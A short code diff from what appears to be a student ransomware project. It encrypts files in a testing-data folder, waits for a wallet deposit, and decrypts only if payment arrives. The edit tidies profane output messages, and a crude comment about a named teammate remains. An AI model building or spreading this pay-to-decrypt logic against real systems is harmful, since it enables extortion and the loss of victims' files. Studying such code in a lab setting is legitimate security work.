@@ -29,12 +29,12 @@ path = "../../testing/cosc469-testing-data"
 encodeFiles(path)
 
 # CALL LOGAN'S bitch ass modal
-print("shit has been encrypted")
+print("Files have been encrypted!")
 
 cw = CheckWallet()
-cw.waitForDeposit()
-decodeFiles(path)
-print("fixed the shit")
+if cw.waitForDeposit():
+    decodeFiles(path)
+print("Files have been decrypted!")
 
 
 # create a socket object
